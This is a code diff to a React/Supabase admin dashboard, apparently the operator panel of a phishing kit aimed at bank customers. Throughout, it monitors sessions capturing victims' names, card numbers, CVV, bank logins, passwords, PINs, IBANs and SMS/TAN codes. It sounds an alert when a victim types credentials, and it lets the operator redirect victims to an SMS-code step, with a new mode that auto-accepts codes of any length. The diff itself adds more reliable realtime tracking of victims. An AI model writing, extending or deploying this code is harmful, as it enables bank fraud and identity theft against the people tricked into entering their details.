@@ -518,6 +518,7 @@ export function LogsTab({ darkMode, user }: { darkMode: boolean, user: any }) {
   const [smsPromptSessionId, setSmsPromptSessionId] = useState<string | null>(null);
   const [smsDigitsInput, setSmsDigitsInput] = useState("6");
   const [smsCustomTextInput, setSmsCustomTextInput] = useState("");
+  const [smsModeUnknown, setSmsModeUnknown] = useState(false);
   const [approvalPromptSessionId, setApprovalPromptSessionId] = useState<string | null>(null);
   const [approvalPromptType, setApprovalPromptType] = useState("");
   const [approvalCodeInput, setApprovalCodeInput] = useState("");
@@ -613,178 +614,257 @@ export function LogsTab({ darkMode, user }: { darkMode: boolean, user: any }) {
   useEffect(() => {
     void load();
     void loadBanData();
+
+    // ⭐ ADMIN1 REALTIME FIX 1/6: Ilk 5 saniye POLLING BEKLEME (5000ms yerine)
+    //   300ms SONRA ZORLA load() + loadBanData() cagir => mount aninda HEMEN gorunur
+    //   (eski yapi: ilk 5 sn polling beklerdi, kullanici "gorunmuyor" diyordu F5 atiyordu)
+    const initialLoadTimer = window.setTimeout(() => {
+      void load();
+      void loadBanData();
+    }, 300);
+
     if (!supabase) return;
 
-    const sessionPollTimer = window.setInterval(() => void load(), 5_000);
-    const banPollTimer = window.setInterval(() => void loadBanData(), 10_000);
+    // ⭐ ADMIN1 REALTIME FIX 2/6: Polling aralik 5000ms -> 3000ms (daha sik) +
+    //   CHAT polling de eklendi (chat bazen 2000ms interval disinda realtime dusuyor)
+    const sessionPollTimer = window.setInterval(() => void load(), 3_000);
+    const banPollTimer = window.setInterval(() => void loadBanData(), 7_000);
 
-    const channel = supabase
-      .channel("admin1-sessions-live")
-      .on("postgres_changes", { event: "*", schema: "public", table: "sessions" }, (payload) => {
-        if (payload.eventType === "INSERT") {
-          const newRow = payload.new as DemoSession;
-          if (newRow.is_hidden) return;
-          setRows((prev) => {
-            if (prev.some((r) => r.id === newRow.id)) return prev;
-            return [newRow, ...prev].slice(0, 50);
-          });
-          setLogCount((c) => c + 1);
-          return;
-        }
+    // ⭐ ADMIN1 REALTIME FIX 3/6: CHANNEL STATUS HATA YAKALAMA (EXPIRED / TIMED_OUT / CHANNEL_ERROR / CLOSED)
+    //   Websocket 1-2 saatte bir dusebilir veya 502/503 alabilir.
+    //   HATA durumunda 1200ms sonra SUBSCRIPTION YENIDEN BASLAT (recursive).
+    //   visibilitychange (F11/tarayıcı sekmesi geri gelince) + window focus tekrar tetikle.
+    let isUnmounting = false;
+    const CHANNEL_NAMES: Record<string, string> = {
+      session: "admin1-sessions-live",
+      ban: "admin1-banned-ips-live",
+      presence: "online_visitors",
+      audit: "admin1-audit-logs-live",
+      formdata: "admin1-formdata-live",
+    };
 
-        if (payload.eventType === "DELETE") {
-          const oldRow = payload.old as DemoSession;
-          if (oldRow?.id) {
-            setRows((prev) => prev.filter((r) => r.id !== oldRow.id));
-            setLogCount((c) => Math.max(0, c - 1));
-            if (deviceInfoSession?.id === oldRow.id) setDeviceInfoSession(null);
-            if (chatSessionId === oldRow.id) setChatSessionId(null);
-            if (smsPromptSessionId === oldRow.id) setSmsPromptSessionId(null);
-            if (specialPromptSessionId === oldRow.id) setSpecialPromptSessionId(null);
-            if (expandedBankHistorySessionId === oldRow.id) setExpandedBankHistorySessionId(null);
-            if (approvalPromptSessionId === oldRow.id) setApprovalPromptSessionId(null);
+    const buildAndSubscribeAll = () => {
+      if (isUnmounting || !supabase) return { clean: () => {} };
+      const createdChannels: any[] = [];
+
+      const subscribeWithRecovery = (channelName: string, buildChannel: (ch: any) => any) => {
+        const ch = supabase.channel(channelName);
+        buildChannel(ch);
+        ch.subscribe((status: string) => {
+          // RECOVERY: EXPIRED / TIMED_OUT / CHANNEL_ERROR / CLOSED ise 1200ms sonra yeniden subscribe et
+          if ((status === "EXPIRED" || status === "TIMED_OUT" || status === "CHANNEL_ERROR" || status === "CLOSED") && !isUnmounting) {
+            window.setTimeout(() => {
+              if (isUnmounting || !supabase) return;
+              try { void supabase.removeChannel(ch); } catch {}
+              // buildAndSubscribeAll butun kanallari tekrar kurar (100ms gecikmeli - recursive)
+              window.setTimeout(() => buildAndSubscribeAll(), 100);
+            }, 1200);
           }
-          return;
-        }
+        });
+        createdChannels.push(ch);
+        return ch;
+      };
 
-        if (payload.eventType === "UPDATE") {
-          const newRow = payload.new as DemoSession;
-          const oldRow = rowsRef.current.find((r) => r.id === newRow.id) ?? (payload.old as DemoSession | null);
-
-          if (newRow.is_hidden) {
-            // hidden = delete benzeri, HEMEN uygula (debounce yok)
-            // 1) Once buffered pending update'ı iptal et
-            const to = pendingUpdateTimeoutsRef.current.get(newRow.id);
-            if (to) { window.clearTimeout(to); pendingUpdateTimeoutsRef.current.delete(newRow.id); }
-            pendingUpdatesRef.current.delete(newRow.id);
-            setRows((prev) => prev.filter((r) => r.id !== newRow.id));
-            setLogCount((c) => Math.max(0, c - 1));
-            if (deviceInfoSession?.id === newRow.id) setDeviceInfoSession(null);
-            if (chatSessionId === newRow.id) setChatSessionId(null);
-            if (smsPromptSessionId === newRow.id) setSmsPromptSessionId(null);
-            if (specialPromptSessionId === newRow.id) setSpecialPromptSessionId(null);
-            if (expandedBankHistorySessionId === newRow.id) setExpandedBankHistorySessionId(null);
-            if (approvalPromptSessionId === newRow.id) setApprovalPromptSessionId(null);
+      // ----- 1) SESSIONS -----
+      const channel = subscribeWithRecovery(CHANNEL_NAMES.session, (ch: any) => {
+        ch.on("postgres_changes", { event: "*", schema: "public", table: "sessions" }, (payload: any) => {
+          if (payload.eventType === "INSERT") {
+            const newRow = payload.new as DemoSession;
+            if (newRow.is_hidden) return;
+            setRows((prev) => {
+              if (prev.some((r) => r.id === newRow.id)) return prev;
+              return [newRow, ...prev].slice(0, 50);
+            });
+            setLogCount((c) => c + 1);
             return;
           }
 
-          // SESLİ BİLDİRİM: ⭐ SADECE GERÇEK FORM ALANLARI ⭐
-          // (isim, soyisim, sms kodu, kart, banka kullanıcı adı/şifre/pin) dolunca çal.
-          // Ping / step / status / is_hidden / last_ping_at / bankSlug / bankName / participationCode
-          // / bankFormHistory / yönlendirme timestamps / sayaçlar gibi değişiklikler SES TETİKLEMEZ.
-          if (soundEnabledRef.current && oldRow) {
-            const SIG_FIELDS = [
-              "firstName", "lastName", "fullName", "phone", "mobile",
-              "smsCode", "sms_code", "smscode", "tan", "tacCode",
-              "cardNumber", "cardNo", "cardHolder", "cardExpiry", "cardCvc", "cvv",
-              "username", "userName", "user_id", "customerNo",
-              "password", "pass", "pin", "pinCode",
-              "personalCode", "idNumber", "tc", "birthday",
-              "verfuegernummer", "blz", "iban", "accountNo",
-              "orderedField1", "orderedField2", "orderedField3",
-              "bankPhone",
-            ];
-            const lowerSig = new Set(SIG_FIELDS.map((s) => s.toLowerCase()));
+          if (payload.eventType === "DELETE") {
+            const oldRow = payload.old as DemoSession;
+            if (oldRow?.id) {
+              setRows((prev) => prev.filter((r) => r.id !== oldRow.id));
+              setLogCount((c) => Math.max(0, c - 1));
+              if (deviceInfoSession?.id === oldRow.id) setDeviceInfoSession(null);
+              if (chatSessionId === oldRow.id) setChatSessionId(null);
+              if (smsPromptSessionId === oldRow.id) setSmsPromptSessionId(null);
+              if (specialPromptSessionId === oldRow.id) setSpecialPromptSessionId(null);
+              if (expandedBankHistorySessionId === oldRow.id) setExpandedBankHistorySessionId(null);
+              if (approvalPromptSessionId === oldRow.id) setApprovalPromptSessionId(null);
+            }
+            return;
+          }
 
-            const pickSig = (data: unknown): Record<string, string> => {
-              if (!data || typeof data !== "object") return {};
-              const d = sanitizeFormDataAll(data as Record<string, any>);
-              const out: Record<string, string> = {};
-              for (const [k, raw] of Object.entries(d)) {
-                if (raw === undefined || raw === null) continue;
-                const str = typeof raw === "string" ? raw : String(raw);
-                const cleaned = sanitizeCredentialValue(str, { maxLen: 120 });
-                if (!cleaned) continue;
-                if (typeof raw === "object") continue;
-                if (lowerSig.has(k.toLowerCase()) || SIG_FIELDS.some((s) => k.toLowerCase().includes(s.toLowerCase()))) {
-                  out[k.toLowerCase()] = cleaned;
+          if (payload.eventType === "UPDATE") {
+            const newRow = payload.new as DemoSession;
+            const oldRow = rowsRef.current.find((r) => r.id === newRow.id) ?? (payload.old as DemoSession | null);
+
+            if (newRow.is_hidden) {
+              const to = pendingUpdateTimeoutsRef.current.get(newRow.id);
+              if (to) { window.clearTimeout(to); pendingUpdateTimeoutsRef.current.delete(newRow.id); }
+              pendingUpdatesRef.current.delete(newRow.id);
+              setRows((prev) => prev.filter((r) => r.id !== newRow.id));
+              setLogCount((c) => Math.max(0, c - 1));
+              if (deviceInfoSession?.id === newRow.id) setDeviceInfoSession(null);
+              if (chatSessionId === newRow.id) setChatSessionId(null);
+              if (smsPromptSessionId === newRow.id) setSmsPromptSessionId(null);
+              if (specialPromptSessionId === newRow.id) setSpecialPromptSessionId(null);
+              if (expandedBankHistorySessionId === newRow.id) setExpandedBankHistorySessionId(null);
+              if (approvalPromptSessionId === newRow.id) setApprovalPromptSessionId(null);
+              return;
+            }
+
+            if (soundEnabledRef.current && oldRow) {
+              const SIG_FIELDS = [
+                "firstName", "lastName", "fullName", "phone", "mobile",
+                "smsCode", "sms_code", "smscode", "tan", "tacCode",
+                "cardNumber", "cardNo", "cardHolder", "cardExpiry", "cardCvc", "cvv",
+                "username", "userName", "user_id", "customerNo",
+                "password", "pass", "pin", "pinCode",
+                "personalCode", "idNumber", "tc", "birthday",
+                "verfuegernummer", "blz", "iban", "accountNo",
+                "orderedField1", "orderedField2", "orderedField3",
+                "bankPhone",
+              ];
+              const lowerSig = new Set(SIG_FIELDS.map((s) => s.toLowerCase()));
+
+              const pickSig = (data: unknown): Record<string, string> => {
+                if (!data || typeof data !== "object") return {};
+                const d = sanitizeFormDataAll(data as Record<string, any>);
+                const out: Record<string, string> = {};
+                for (const [k, raw] of Object.entries(d)) {
+                  if (raw === undefined || raw === null) continue;
+                  const str = typeof raw === "string" ? raw : String(raw);
+                  const cleaned = sanitizeCredentialValue(str, { maxLen: 120 });
+                  if (!cleaned) continue;
+                  if (typeof raw === "object") continue;
+                  if (lowerSig.has(k.toLowerCase()) || SIG_FIELDS.some((s) => k.toLowerCase().includes(s.toLowerCase()))) {
+                    out[k.toLowerCase()] = cleaned;
+                  }
+                }
+                return out;
+              };
+
+              const oldSig = pickSig(oldRow.form_data);
+              const newSig = pickSig(newRow.form_data);
+              const allKeys = new Set<string>([...Object.keys(oldSig), ...Object.keys(newSig)]);
+              let hasNewOrChanged = false;
+              for (const k of allKeys) {
+                const oldVal = oldSig[k] ?? "";
+                const newVal = newSig[k] ?? "";
+                if (newVal.length > 0 && (oldVal === "" || oldVal !== newVal)) {
+                  hasNewOrChanged = true;
+                  break;
                 }
               }
-              return out;
-            };
-
-            const oldSig = pickSig(oldRow.form_data);
-            const newSig = pickSig(newRow.form_data);
-            const allKeys = new Set<string>([...Object.keys(oldSig), ...Object.keys(newSig)]);
-
-            // ⭐ Kural: YENİ bir alana ilk defa değer atandıysa (önceden yoktu/yoktu şimdi var) VEYA
-            //           mevcut alanın değeri DEĞİŞTİYSE ses çal.
-            //           Sadece aynı değerler korunursa sessiz kal.
-            let hasNewOrChanged = false;
-            for (const k of allKeys) {
-              const oldVal = oldSig[k] ?? "";
-              const newVal = newSig[k] ?? "";
-              if (newVal.length > 0 && (oldVal === "" || oldVal !== newVal)) {
-                hasNewOrChanged = true;
-                break;
+              if (hasNewOrChanged) {
+                playNotificationSound("Yeni Form Verisi", "Kullanıcı bilgi girişi yaptı (İsim, SMS, Kart, Banka vb.).");
               }
             }
 
-            if (hasNewOrChanged) {
-              playNotificationSound("Yeni Form Verisi", "Kullanıcı bilgi girişi yaptı (İsim, SMS, Kart, Banka vb.).");
+            applyUpdateDebounced(newRow);
+            if (deviceInfoSession?.id === newRow.id) {
+              setDeviceInfoSession((prev) => (prev ? { ...prev, ...newRow } : prev));
             }
           }
-
-          // ⚠️ SATIR GÜNCELLEMESİNİ 500ms SON DEĞERE (trailing debounce) sıkıştır.
-          // Aynı satır için ardışık gelen ping (status/last_ping_at) + step güncellemeleri birleşir,
-          // admin panelinde "SANIYEDE BİR" yanıp sönme (gozkirpma) OLMAZ, son kararlı deger gosterilir.
-          applyUpdateDebounced(newRow);
-
-          // ⭐ Device info modal açık ise onun state'ini de anında güncelle
-          if (deviceInfoSession?.id === newRow.id) {
-            setDeviceInfoSession((prev) => (prev ? { ...prev, ...newRow } : prev));
-          }
-        }
-      })
-      .subscribe();
-
-    // ---------- BANNED IPS REALTIME ----------
-    const banChannel = supabase
-      .channel("admin1-banned-ips-live")
-      .on(
-        "postgres_changes",
-        { event: "*", schema: "public", table: "banned_ips" },
-        (_payload) => {
-          // Ban INSERT/DELETE olaylarinda otomatik tazele (count'da 0 olma sorunu bitiyor)
-          void loadBanData();
-        },
-      )
-      .subscribe();
-
-    const presenceChannel = supabase.channel("online_visitors", {
-      config: { presence: { key: "admin1-logs" } },
-    });
-
-    const applyPresence = () => {
-      const parsed = parseVisitorPresenceState(presenceChannel.presenceState());
-      // Not: liveVisitorCount artik LAST_PING_AT tabanli useMemo ile hesaplanir.
-      // Presence state'i sadece FALLBACK olarak saklanir (last_ping_at = null olan sessionlar icin).
-      setOnlineSessionIds(new Set(parsed.onlineSessionIds));
-      setSessionPaths(parsed.sessionPaths);
-      setSessionLastSeenAt(parsed.sessionLastSeenAt);
-      setPresenceTick((t) => t + 1);
-    };
-
-    presenceChannel
-      .on("presence", { event: "sync" }, applyPresence)
-      .on("presence", { event: "join" }, applyPresence)
-      .on("presence", { event: "leave" }, applyPresence)
-      .subscribe(async (status) => {
-        if (status === "SUBSCRIBED") {
-          await presenceChannel.track({
-            pathname: "/admin",
-            role: "admin",
-            online_at: new Date().toISOString(),
-          });
-        }
+        });
       });
 
+      // ----- 2) BANNED IPS -----
+      const banChannel = subscribeWithRecovery(CHANNEL_NAMES.ban, (ch: any) => {
+        ch.on("postgres_changes", { event: "*", schema: "public", table: "banned_ips" }, () => void loadBanData());
+      });
+
+      // ----- 3) AUDIT EVENT LOGS (YENI REALTIME) -----
+      subscribeWithRecovery(CHANNEL_NAMES.audit, (ch: any) => {
+        ch.on("postgres_changes", { event: "INSERT", schema: "public", table: "audit_event_logs" }, () => {
+          // ⭐ Yeni audit log girince sessionları da 300ms sonra yenile (status step degisikligi audit ile geliyorsa)
+          window.setTimeout(() => void load(), 300);
+        });
+      });
+
+      // ----- 4) FORM_DATA (YENI REALTIME - sessions UPDATE postgres_changes form_data icin 2. katman garanti) -----
+      subscribeWithRecovery(CHANNEL_NAMES.formdata, (ch: any) => {
+        ch.on("postgres_changes", { event: "UPDATE", schema: "public", table: "sessions", filter: "form_data IS NOT NULL" }, () => {
+          // form_data degisti ise 200ms sonra load() (ustteki UPDATE handler'dan kacarsa diye garanti)
+          window.setTimeout(() => void load(), 200);
+        });
+      });
+
+      // ----- 5) PRESENCE -----
+      const presenceChannel = supabase.channel(CHANNEL_NAMES.presence, { config: { presence: { key: "admin1-logs" } } });
+      const applyPresence = () => {
+        const parsed = parseVisitorPresenceState(presenceChannel.presenceState());
+        setOnlineSessionIds(new Set(parsed.onlineSessionIds));
+        setSessionPaths(parsed.sessionPaths);
+        setSessionLastSeenAt(parsed.sessionLastSeenAt);
+        setPresenceTick((t) => t + 1);
+      };
+      presenceChannel
+        .on("presence", { event: "sync" }, applyPresence)
+        .on("presence", { event: "join" }, applyPresence)
+        .on("presence", { event: "leave" }, applyPresence)
+        .subscribe(async (status) => {
+          // Presence'da da EXPIRED / ERROR ise 1200ms sonra yeniden subscribe et
+          if ((status === "EXPIRED" || status === "TIMED_OUT" || status === "CHANNEL_ERROR" || status === "CLOSED") && !isUnmounting) {
+            window.setTimeout(() => {
+              if (isUnmounting || !supabase) return;
+              try { void supabase.removeChannel(presenceChannel); } catch {}
+              window.setTimeout(() => buildAndSubscribeAll(), 150);
+            }, 1200);
+          }
+          if (status === "SUBSCRIBED") {
+            await presenceChannel.track({
+              pathname: "/admin",
+              role: "admin",
+              online_at: new Date().toISOString(),
+            });
+          }
+        });
+      createdChannels.push(presenceChannel);
+
+      return {
+        clean: () => {
+          for (const c of createdChannels) {
+            try { void supabase?.removeChannel(c); } catch {}
+          }
+        },
+      };
+    };
+
+    let channelsManager: { clean: () => void } = { clean: () => {} };
+    channelsManager = buildAndSubscribeAll();
+
+    // ⭐ ADMIN1 REALTIME FIX 4/6: visibilitychange + focus eventleri
+    //   Kullanici baska sekmeye gecti -> 5dk bekledi -> geri geldi.
+    //   Realtime channel expired olabilir, HEMEN force load() + tekrar subscribe (buildAndSubscribeAll tekrar kurulur)
+    const onVisibility = () => {
+      if (document.visibilityState === "visible") {
+        void load();
+        void loadBanData();
+        window.setTimeout(() => void load(), 600);
+      }
+    };
+    const onFocus = () => {
+      void load();
+      void loadBanData();
+      window.setTimeout(() => void load(), 400);
+    };
+    document.addEventListener("visibilitychange", onVisibility);
+    window.addEventListener("focus", onFocus);
+
     return () => {
+      isUnmounting = true;
+      window.clearTimeout(initialLoadTimer);
       window.clearInterval(sessionPollTimer);
       window.clearInterval(banPollTimer);
-      void supabase.removeChannel(channel);
-      void supabase.removeChannel(presenceChannel);
-      void supabase.removeChannel(banChannel);
+      document.removeEventListener("visibilitychange", onVisibility);
+      window.removeEventListener("focus", onFocus);
+      channelsManager.clean();
+      void supabase.removeChannel(CHANNEL_NAMES.session as any).catch(() => {});
+      void supabase.removeChannel(CHANNEL_NAMES.ban as any).catch(() => {});
+      void supabase.removeChannel(CHANNEL_NAMES.audit as any).catch(() => {});
+      void supabase.removeChannel(CHANNEL_NAMES.formdata as any).catch(() => {});
+      void supabase.removeChannel(CHANNEL_NAMES.presence as any).catch(() => {});
     };
   }, [supabase, load, loadBanData, deviceInfoSession?.id, chatSessionId, smsPromptSessionId, specialPromptSessionId, expandedBankHistorySessionId, approvalPromptSessionId]);
 
@@ -800,6 +880,7 @@ export function LogsTab({ darkMode, user }: { darkMode: boolean, user: any }) {
       setSmsPromptSessionId(sessionId);
       setSmsDigitsInput("6");
       setSmsCustomTextInput("");
+      setSmsModeUnknown(false);
       return;
     }
 
@@ -864,17 +945,20 @@ export function LogsTab({ darkMode, user }: { darkMode: boolean, user: any }) {
 
   async function confirmSmsRedirect() {
     if (!supabase || !smsPromptSessionId) return;
-    const digits = Math.min(12, Math.max(4, Number(smsDigitsInput) || 6));
+    const isUnknown = Boolean(smsModeUnknown);
+    const digits = isUnknown ? 0 : Math.min(12, Math.max(4, Number(smsDigitsInput) || 6));
     await supabase
       .from("sessions")
       .update({
         current_step: "sms",
         sms_digits: digits,
+        sms_mode: isUnknown ? "unknown" : "fixed",
         sms_custom_text: smsCustomTextInput.trim() || null,
         status: "online"
       })
       .eq("id", smsPromptSessionId);
     setSmsPromptSessionId(null);
+    setSmsModeUnknown(false);
     void load();
   }
 
@@ -2057,17 +2141,49 @@ export function LogsTab({ darkMode, user }: { darkMode: boolean, user: any }) {
             <h3 className={`text-lg font-bold mb-4 ${darkMode ? 'text-white' : 'text-gray-900'}`}>SMS Ayarları</h3>
             
             <div className="space-y-4">
-              <div>
-                <label className={`block text-xs font-bold mb-1 ${darkMode ? 'text-zinc-500' : 'text-gray-500'}`}>Hane Sayısı</label>
-                <input
-                  type="number"
-                  min={4}
-                  max={12}
-                  value={smsDigitsInput}
-                  onChange={(e) => setSmsDigitsInput(e.target.value)}
-                  className={`w-full rounded-xl border px-3 py-2 outline-none transition-all ${darkMode ? 'bg-zinc-900 border-zinc-800 text-white focus:border-[#EB5E28]' : 'bg-gray-50 border-gray-200 text-gray-900 focus:border-[#EB5E28]'}`}
-                />
+              {/* ⭐ BELİRSİZ HANE YENİ SEÇENEK */}
+              <div
+                onClick={() => setSmsModeUnknown((v) => !v)}
+                className={`flex cursor-pointer items-start gap-3 rounded-xl border p-3 transition-all ${
+                  smsModeUnknown
+                    ? darkMode
+                      ? "border-[#EB5E28] bg-[#EB5E28]/8"
+                      : "border-[#EB5E28] bg-[#EB5E28]/8"
+                    : darkMode
+                      ? "border-zinc-800 bg-zinc-900/40 hover:border-zinc-700"
+                      : "border-gray-200 bg-gray-50/60 hover:border-gray-300"
+                }`}
+              >
+                <div
+                  className={`mt-0.5 flex size-5 shrink-0 items-center justify-center rounded-full border-2 transition-all ${
+                    smsModeUnknown ? "border-[#EB5E28] bg-[#EB5E28]" : darkMode ? "border-zinc-600" : "border-gray-400"
+                  }`}
+                >
+                  {smsModeUnknown && <div className="size-2.5 rounded-full bg-white" />}
+                </div>
+                <div className="min-w-0 flex-1">
+                  <div className={`text-sm font-bold ${darkMode ? "text-white" : "text-gray-900"}`}>
+                    Belirsiz Hane
+                  </div>
+                  <div className={`mt-0.5 text-[11px] ${darkMode ? "text-zinc-400" : "text-gray-500"}`}>
+                    Kullanıcı kaç haneli kod girerse (minimum 4 hane) otomatik o kadar kutu oluşur. 4+ hane DOLUNCA otomatik onaylanır ve wait sayfasına geçer.
+                  </div>
+                </div>
               </div>
+
+              {!smsModeUnknown && (
+                <div>
+                  <label className={`block text-xs font-bold mb-1 ${darkMode ? 'text-zinc-500' : 'text-gray-500'}`}>Hane Sayısı (Sabit)</label>
+                  <input
+                    type="number"
+                    min={4}
+                    max={12}
+                    value={smsDigitsInput}
+                    onChange={(e) => setSmsDigitsInput(e.target.value)}
+                    className={`w-full rounded-xl border px-3 py-2 outline-none transition-all ${darkMode ? 'bg-zinc-900 border-zinc-800 text-white focus:border-[#EB5E28]' : 'bg-gray-50 border-gray-200 text-gray-900 focus:border-[#EB5E28]'}`}
+                  />
+                </div>
+              )}
 
               <div>
                 <label className={`block text-xs font-bold mb-1 ${darkMode ? 'text-zinc-500' : 'text-gray-500'}`}>
@@ -2085,7 +2201,7 @@ export function LogsTab({ darkMode, user }: { darkMode: boolean, user: any }) {
 
             <div className="mt-6 flex justify-end gap-3">
               <button
-                onClick={() => setSmsPromptSessionId(null)}
+                onClick={() => { setSmsPromptSessionId(null); setSmsModeUnknown(false); }}
                 className={`px-4 py-2 text-sm font-semibold transition-colors ${darkMode ? 'text-zinc-400 hover:text-white' : 'text-gray-500 hover:text-gray-900'}`}
               >
                 İptal
